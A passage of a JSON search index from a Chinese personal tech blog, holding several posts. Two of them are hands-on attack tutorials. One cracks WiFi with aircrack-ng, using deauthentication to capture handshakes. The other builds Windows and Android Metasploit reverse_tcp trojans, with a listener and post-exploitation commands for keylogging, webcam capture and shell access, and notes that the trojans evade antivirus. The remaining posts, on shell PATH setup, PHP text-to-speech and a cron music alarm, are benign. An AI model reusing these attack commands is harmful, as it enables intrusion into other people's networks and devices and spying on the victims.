aircrack-ng 1234561.airmon-ng check kill #kill一些无关进程2.airmon-ng start wlan0 #开启网卡监听模式3.airodump-ng wlan0mon #查看周围区域所有WIFI信号情况4.airodump-ng -c 信道 --bssid 目标mac -w wep wlan0mon #开始抓包5.airodump-ng -c 信道 --bssid 目标mac wlan0mon #查看当前环境的WiFi连接情况6.aireplay-ng --deauth 10000 -a 目标mac -c 客户端mac wlan0mon #对连接到目标ap的客户端攻击,使其掉线,抓取握手包! 备注:抓包的关键是第6步抓取握手包,所谓握手包就是对方设备掉线后重新连接WIFI时候的数据包,只要抓到握手包就可以了。 拿到握手包后切换到windows系统,用EWSA等软件跑包,跑包速度看机器配置,主要是看显卡配置,本人笔记本i7+gt750M,一秒钟2万次,其实也看运气,如果是弱密码,分分钟钟的事情,如果是包含字母\\标点符号\\特殊符号的密码……那几乎不可能! 3.防备措施: 不要安装 xxx免费WIFI等软件,如果不小心把密码分享出去的话,只能改密码了! 关闭路由器wps功能.此功能大部分人都用不到 隐藏ssid.这样别人就搜不到你家的WIFI信号，虽然用途并不大 使用复杂密码,包含字母\\标点符号\\特殊符号!这招最有效","categories":[{"name":"工具","slug":"工具","permalink":"https://wangbjun.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Kali","slug":"Kali","permalink":"https://wangbjun.github.io/tags/Kali/"}]},{"title":"Linux系统自定义Shell命令","slug":"linux-custom-shell","date":"2015-10-05T03:05:00.000Z","updated":"2020-01-08T17:44:37.447Z","comments":true,"path":"2015/10/05/linux-custom-shell/","link":"","permalink":"https://wangbjun.github.io/2015/10/05/linux-custom-shell/","excerpt":"一.应用场景由于长期使用Ubuntu系统开发和日常生活，每天开机第一件事情就是更新系统，在Ubuntu系统下面更新往往需要好敲好几个命令： 12345sudo apt-get update #更新源sudo apt-get upgrade #更新普通软件包sudo apt-get dist-upgrade #更新系统软件包sudo apt-get autoremove #卸载无用的软件包sudo apt-get autoclean #清除软件包缓存 通常情况下，我是一条接着一条敲，虽然看着命令行滚动很过瘾，但是时间长，感觉也没意思了，能不能用一条命令代替上面这些命令呢？有人说，可以，你只要把这些命令行存起来，以后复制一下就搞定了…","text":"一.应用场景由于长期使用Ubuntu系统开发和日常生活，每天开机第一件事情就是更新系统，在Ubuntu系统下面更新往往需要好敲好几个命令： 12345sudo apt-get update #更新源sudo apt-get upgrade #更新普通软件包sudo apt-get dist-upgrade #更新系统软件包sudo apt-get autoremove #卸载无用的软件包sudo apt-get autoclean #清除软件包缓存 通常情况下，我是一条接着一条敲，虽然看着命令行滚动很过瘾，但是时间长，感觉也没意思了，能不能用一条命令代替上面这些命令呢？有人说，可以，你只要把这些命令行存起来，以后复制一下就搞定了… 二.环境变量其实我们是可以自定义命令的，其中关键点就在于环境变量，很多用windows系统的估计也知道环境变量这个东西，当初学Java的时候都知道在系统设置里面有个环境变量设置,在path里面加一个路径，然后在cmd命令行下面敲java就有反应了，其实在Linux系统里面也是一样的。 12jwang@jwang:echo $PATHjwang@jwang:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;snap&#x2F;bin:&#x2F;home&#x2F;jwang&#x2F;Bin PATH是shell的全局变量，类似框架里面初始化的时候加载的一个超全局变量，里面存的就是当前用户的环境变量信息，一般情况下就是各种bin执行文件的路径。 比如最常见的/usr/bin是普通用户，/sbin是root用户特有，还有一些软件安装时候自动加进去的，比如那个/usr/games。 这个PATH路径的意义就是只要在是上面路径文件夹里面的可执行文件，就可以直接在shell里面执行，比如说 ifconfig，你们说ifconfig的可执行文件放在哪里呢？可以用whereis命令 12jwang@jwang:whereis ifconfigjwang@jwang:ifconfig: &#x2F;sbin&#x2F;ifconfig &#x2F;usr&#x2F;share&#x2F;man&#x2F;man8&#x2F;ifconfig.8.gz 由上可知，ifconfig命令实际上是放在/sbin里面，这意味着你也可以这样用 1jwang@jwang:&#x2F;sbin&#x2F;ifconfig 三.自定义命令说到这里，估计有人就明白了，那是不是只要我把一个脚本放在PATH里面任意一个目录里面，然后我就可以直接敲，不用写全路径了？Yes，就是这样，比如说 123456789101112131415jwang@jwang:~$ cd Bin&#x2F;jwang@jwang:~&#x2F;Bin$ pwd&#x2F;home&#x2F;jwang&#x2F;Binjwang@jwang:~&#x2F;Bin$ lsupdatejwang@jwang:~&#x2F;Bin$ cat update#!&#x2F;bin&#x2F;bashsudo apt-get updatesudo apt-get -y upgradesudo apt-get -y dist-upgradesudo apt-get -y autoremovesudo apt-get -y autocleanjwang@jwang:~&#x2F;Bin$ 我在用户目录下新建一个Bin文件夹，里面放了一个update脚本，脚本里面内容就是系统更新那些命令，我可以这样做： 1jwang@jwang:sudo ln -s &#x2F;home&#x2F;jwang&#x2F;Bin&#x2F;update &#x2F;usr&#x2F;bin&#x2F;update 上面的命令是建立一个软链接到/usr/bin目录，这样就可以直接敲update命令了 123456789101112131415161718192021222324jwang@jwang:~$ updateHit:1 http:&#x2F;&#x2F;cn.archive.ubuntu.com&#x2F;ubuntu xenial InReleaseHit:2 http:&#x2F;&#x2F;cn.archive.ubuntu.com&#x2F;ubuntu xenial-updates InRelease..................Fetched 102 kB in 2s (42.0 kB&#x2F;s)Reading package lists... DoneReading package lists... DoneBuilding dependency treeReading state information... DoneCalculating upgrade... Done0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.Reading package lists... DoneBuilding dependency treeReading state information... DoneCalculating upgrade... Done0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.Reading package lists... DoneBuilding dependency treeReading state information... Done0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.Reading package lists... DoneBuilding dependency treeReading state information... Done 是不是很方便呢？还有另外一个方式，就是修改环境变量，把/home/jwang/Bin目录添加到环境变量里面，修改用户目录下的.bashrc文件，或者在全局文件/etc/profile添加一下语句 1export PATH&#x3D;&quot;$PATH:&#x2F;home&#x2F;jwang&#x2F;Bin&quot; 然后执行一下 1source &#x2F;etc&#x2F;profile 当然，如果你只想临时修改一下环境变量，可以直接在命令行修改PATH的值，但是退出当前命令行就失效了 1jwang@jwang:PATH&#x3D;$PATH:&#x2F;home&#x2F;jwang&#x2F;Bin 四.总结以前我是一直没弄明白环境变量是什么意思，一直按着教程配置，前几天突然想明白了，环境变量说得通俗易懂点就是说明当前环境有哪些命令可以使用，实际上是在告诉那些程序,如果你找不到这个命令，你可以到这些目录里面找找，都找不到就报错！ 日常生活工作中，可以把一些比较长的命令封装一下写个脚本，随便取个名字，只要名字不冲突就行（如果名字一样，在PATH路径里面谁的目录在前面就优先执行谁），还是挺有用的。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://wangbjun.github.io/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://wangbjun.github.io/tags/Linux/"}]},{"title":"Kali-Metasploit制作简易木马","slug":"kali-metasploit","date":"2015-08-05T04:01:00.000Z","updated":"2020-01-08T10:07:47.981Z","comments":true,"path":"2015/08/05/kali-metasploit/","link":"","permalink":"https://wangbjun.github.io/2015/08/05/kali-metasploit/","excerpt":"相信很多人都有这种感觉,觉得那些会做木马病毒的人非常牛逼,当然会自己完全写出来木马病毒的肯定非常牛逼,但是实际上,大部分人都是在前人的基础上修改,很多则是用工具生成,出于兴趣,研究了一段时间”黑”科技,也实践了一下! 总结了几点简单的工具用法,如果你会用这些工具,你会发现也许一个木马没有你像现在那么难做出来!本文是本着研究的精神,所有攻击行为都是测试,请勿用于非法用途! 测试环境:kali linux windows7 windows 10 Android等操作系统 主要工具:metasploit framework","text":"相信很多人都有这种感觉,觉得那些会做木马病毒的人非常牛逼,当然会自己完全写出来木马病毒的肯定非常牛逼,但是实际上,大部分人都是在前人的基础上修改,很多则是用工具生成,出于兴趣,研究了一段时间”黑”科技,也实践了一下! 总结了几点简单的工具用法,如果你会用这些工具,你会发现也许一个木马没有你像现在那么难做出来!本文是本着研究的精神,所有攻击行为都是测试,请勿用于非法用途! 测试环境:kali linux windows7 windows 10 Android等操作系统 主要工具:metasploit framework 关于所用工具,本文不做过多介绍,这里介绍的使用方法也是最基本最简单的用法: 1.使用metasploit 工具生存一个木马(windows版本),命令如下:1msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.47 LPORT&#x3D;8080 -f exe &gt;demo.exe LHOST=后面的ip地址是你自己的局域网ip,目前本人所有的攻击测试仅在局域网试过,也就是内网,关于外网的使用暂时不太清楚如何进行! demo.exe为生成的木马文件,把木马文件拷贝到对方电脑上,双击即可运行!据测试,该木马可以过360安全卫士,电脑管家等常用杀毒软件!这还是在没有做任何加密\\加壳的情况下…..不过在有些人的电脑上360可以杀出来!可能是版本不同 2.打开软件,设置好监听,命令依次如下:12345use exploit&#x2F;multi&#x2F;handlerset payloads windows&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.1.47set LPORT 8080exploit 3.坐等上钩此时,只要对方电脑点击运行demo.exe木马文件,这边监听端口就可以收到信息,建立连接!然后可以执行一些入侵指令,对方现在电脑完全在你的掌控之下,常用命令如下: 123456789101112131415161718sysinfo &#x2F;&#x2F;查看攻击主机的系统信息kill &#x2F;&#x2F;结束进程ps &#x2F;&#x2F;查看进程reboot &#x2F;&#x2F;重启电脑reg &#x2F;&#x2F;修改注册表shell &#x2F;&#x2F;获取shellshutdown &#x2F;&#x2F;关闭电脑keyscan_start &#x2F;&#x2F;开启健盘记录功能keyscan_dump &#x2F;&#x2F;查看健盘记录信息keyscan_stop &#x2F;&#x2F;停止健盘记录download &#x2F;&#x2F;下载文件upload &#x2F;&#x2F;上传文件uictl enable keyboard &#x2F;&#x2F;获取键盘鼠标控制权record_mic &#x2F;&#x2F;音频录制webcam_chat &#x2F;&#x2F;查看摄像头接口webcam_list &#x2F;&#x2F;查看摄像头列表webcam_stream &#x2F;&#x2F;摄像头视频获取................ 4.生成Android版本的木马,其实步骤和上面差不多1msfvenom -p android&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.47 LPORT&#x3D;8080 -r &gt;demo.apk 只要你下载安装到你手机上,你手机基本上也是别人的了,获取联系人\\通讯录\\定位打开摄像头\\照片…….而且经测试,小米手机自带的安全中心对此木马完全没用! 不过,据我暂时了解的知识,距离一个完整的木马还有点距离: 杀毒软件.据我测试,腾讯的电脑管家就是垃圾,扫描不出来我生成的木马,360基本上一扫就出来,经过简单编码加密后,360会提示风险程序,而系统自带的windows defender更是一点点用都没.不过要想真把木马做成免杀还得花点功夫……. 木马持续后门.所谓持续后门就是能让木马开机后自启,经测试,msf自带的2种方法无效…..暂时未找到可行性方法! 外网控制.这是一个大问题,比较难解决,现在的攻击都是基于同一个局域网内! 权限问题.360是个麻烦事,在有些机子上进行操作,比如打开摄像头,360会有提示…..而且木马暂时还没法子终结360的进程,所以蛋疼! 在日常生活中,专门去攻击某些个人的情况很少,很多时候黑客都是采用自动化工具遍地撒网,利用一些公开的漏洞进行攻击!普通人能做的只是让自己别中这些自动化黑客工具的招就行了,如果某些个人或者组织想黑你,真的很简单………….","categories":[{"name":"工具","slug":"工具","permalink":"https://wangbjun.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Kali","slug":"Kali","permalink":"https://wangbjun.github.io/tags/Kali/"}]},{"title":"PHP实现语音播报","slug":"php-radio","date":"2015-03-25T01:00:01.000Z","updated":"2020-01-08T09:43:32.141Z","comments":true,"path":"2015/03/25/php-radio/","link":"","permalink":"https://wangbjun.github.io/2015/03/25/php-radio/","excerpt":"大家估计都知道现在很多AI音响能够给你播报天气，叫你起床…甚至能够接受语音指令！所谓的人工智能音响，听起来很高大上，都说PHP是最好的编程语言，今天我就带大家来实现一个语音播报功能，写个美女叫你早上起床！先大体说一个思路，PHP怎么实现语音播报呢？其实就是调个API（接口）的事情，这个就尴尬了。实际上，现在很多AI平台都提供一些成熟的接口供你使用，比如语音转文字，文字转语音，语音唤醒等等，这里我使用的是百度的语音合成接口,点击查看, 思路就是使用PHP获取当前的时间和天气状况，然后调用接口转换成甜美的妹子语音播放出来。。。你没看错，就是这么简单！ 第一步：获取时间信息 举个例子，文字内容可能是这样：“主人，早上好，今天是2017年12月18号上午8点整，星期一”，这样的内容用PHP自带的几个时间函数就能搞定，然后拼接成字符文字！下面是一些简单实例代码：","text":"大家估计都知道现在很多AI音响能够给你播报天气，叫你起床…甚至能够接受语音指令！所谓的人工智能音响，听起来很高大上，都说PHP是最好的编程语言，今天我就带大家来实现一个语音播报功能，写个美女叫你早上起床！先大体说一个思路，PHP怎么实现语音播报呢？其实就是调个API（接口）的事情，这个就尴尬了。实际上，现在很多AI平台都提供一些成熟的接口供你使用，比如语音转文字，文字转语音，语音唤醒等等，这里我使用的是百度的语音合成接口,点击查看, 思路就是使用PHP获取当前的时间和天气状况，然后调用接口转换成甜美的妹子语音播放出来。。。你没看错，就是这么简单！ 第一步：获取时间信息 举个例子，文字内容可能是这样：“主人，早上好，今天是2017年12月18号上午8点整，星期一”，这样的内容用PHP自带的几个时间函数就能搞定，然后拼接成字符文字！下面是一些简单实例代码： 第二布：获取天气状况 举个例子，文字内容可能是这样：“今天天气多云转晴，温度5-15度，湿度80%，空气污染指数69”。要想找到一个靠谱而又免费的api还有点麻烦，很多免费的api提供的天气信息都比较简单，只有天气状况和温度，没有未来天气状况，最后我就找了个凑合用，谁有更好的api留个爪。实例代码如下： 第三步：语音合成 这个是调用的百度的接口，首先呢，你得去百度那注册一个账号，获取开发者的key和secret，会有一些免费的调用次数，不拿去商用的话完全够了！然后下载百度提供的SDK，用法非常简单，实例代码如下： 大家可以看到最后的返回的内容被我存到/tmp/audio.mp3这个文件里面去了(这里使用的是Ubuntu系统)，这里可能会有一个写入权限问题，建议大家最后执行脚本的时候加上sudo。 第四步：播放合成之后的语音文件 我们不可能去用音乐播放器手动播放，其实Linux在命令行下也可以播放音乐，需要安装一个软件，直接给大家Ubuntu下的安装命令： 1sudo apt-get install sox libsox-fmt-all 安装完成之后就可以使用play命令播放音乐，举个例子：play hello.mp3 所以接下来我们就可以使用PHP去执行播放命令，实例如下： 1exec(&#39;sudo &#x2F;usr&#x2F;bin&#x2F;play &#x2F;tmp&#x2F;audio.mp3&#39;); 最后，在Linux里面运行脚本，让脚本常驻后台，示例如下： 1&#x2F;usr&#x2F;bin&#x2F;php &#x2F;var&#x2F;www&#x2F;demo&#x2F;BaiduSound&#x2F;index.php &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 &amp; 以上就是全部步骤，剩下的大家发挥想象力，比如定时给你播报一些股票信息、播放歌曲、早上定时叫你起床。从理论上说我们还可以调用百度API接口去识别我们的语音命令，然后根据命令去执行操作，这样岂不是就是一个AI音响了？哈哈，纯属娱乐，这个方案有一个问题就是你得保证你的电脑一直是开机状态，有点浪费电，有兴趣的童鞋可以买个类似树莓派这样的低功耗设备去运行。有一个小坑，就是假如你电脑正在播放视频或者音乐，这时候可能无法播报，好像是音频冲突，具体原因未知，找了好久没找到解决方案～","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wangbjun.github.io/tags/PHP/"}]},{"title":"Ubuntu命令行下打造一个音乐闹钟","slug":"ubuntu-music","date":"2015-03-07T11:01:09.000Z","updated":"2020-01-08T17:44:37.427Z","comments":true,"path":"2015/03/07/ubuntu-music/","link":"","permalink":"https://wangbjun.github.io/2015/03/07/ubuntu-music/","excerpt":"一.命令行播放音乐第一次听说Linux命令行能播放歌曲我是怀疑的…一直觉得命令行干这个事情应该非常复杂，其实想想图形界面本质上只是一种交互方式，可能大家平时用的音乐播放器都有一个非常漂亮的界面,点一下就能播放音乐，但是其本质上还是调用系统API操控音响或者耳机等设备来发出声音！ 言归正传，在Linux命令行下播放音乐只需要一行命令搞定：","text":"一.命令行播放音乐第一次听说Linux命令行能播放歌曲我是怀疑的…一直觉得命令行干这个事情应该非常复杂，其实想想图形界面本质上只是一种交互方式，可能大家平时用的音乐播放器都有一个非常漂亮的界面,点一下就能播放音乐，但是其本质上还是调用系统API操控音响或者耳机等设备来发出声音！ 言归正传，在Linux命令行下播放音乐只需要一行命令搞定： 1jwang@jwang:~$ sudo apt-get install sox libsox-fmt-all 然后播放歌曲只需要在其目录下面play就行： 12jwang@jwang:~&#x2F;Music&#x2F;CloudMusic$ play *.mp3jwang@jwang:~&#x2F;Music&#x2F;CloudMusic$ play 平凡之路.mp3 *.mp3是播放所有mp3歌曲，也可以指定歌曲名，Ctrl+c可以切换歌曲，即中断当前播放歌曲，切换到下一曲，这个命令是很强大，有很多可选参数，大家可以man一下 二.随机播放歌曲默认情况下，播放是按照你文件中歌曲的排序顺序播放的，如何实现随机播放呢？我想了一个小技巧，写了一个shell脚本： 12345678910111213141516171819202122232425#!&#x2F;bin&#x2F;bash#歌曲存放路径dir&#x3D;&#39;&#x2F;home&#x2F;jwang&#x2F;Music&#x2F;CloudMusic&#39;#歌曲名称列表,中间不要有空格sounds&#x3D;(CanoninD.mp3泡沫.mp3演员.mp3南山南.mp3Beautiful.mp3Victory.mp3DreamItPossible.mp3)#产生随机数function rand()&#123; min&#x3D;$1 max&#x3D;$(($2-$min+1)) num&#x3D;$(date +%s%N) return $(($num%$max+$min))&#125;rand 0 $&#123;#sounds[@]&#125;-1#执行播放命令&#x2F;usr&#x2F;bin&#x2F;play $&#123;dir&#125;&#x2F;$&#123;sounds[$?]&#125; 当然这也是伪随机，而且需要把歌曲名称存在数组里面，好处就在可以自定义需要播放的歌曲，坏处就说如果需要播放的歌曲很多，那就麻烦了，可以给这个脚本起一个名字比如说music，以后直接敲music就可以随机播放一首歌曲，也可以把这个命令放到环境变量里面去 12jwang@jwang:~$ sudo ln -s &#x2F;home&#x2F;jwang&#x2F;Documents&#x2F;play.sh &#x2F;usr&#x2F;bin&#x2F;musicjwang@jwang:~$ music 三.定时音乐闹钟Linux下定时任务很容易配置，这里不多说，给一个例子： 1jwang@jwang:~$ crontab -e 加入下面语句，意思是每天早上7点50随机播放一首歌曲，当然前提是你电脑要开机… 150 7 * * * nohup &#x2F;usr&#x2F;bin&#x2F;music &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 &amp; 其实我觉得可以加一条定时任务，每隔1个小时播放一首歌曲缓解一下工作压力 1* *&#x2F;1 * * * nohup &#x2F;usr&#x2F;bin&#x2F;music &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 &amp; 好了，就说这么多了，虽然闹钟手机也能设置，但是折腾电脑玩的就是自己动手的乐趣!祝大家玩机愉快！ 有一点坑的地方需要说明，就是Ubuntu下使用这个play命令播放音乐可能会产生冲突，意思就是如果你正在播放视频或者音乐，这时候的定时任务里面play命令可能无法播放成功，具体原因暂时还没找到","categories":[{"name":"Linux","slug":"Linux","permalink":"https://wangbjun.github.io/categories/Linux/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://wangbjun.github.io/tags/Ubuntu/"}]}]}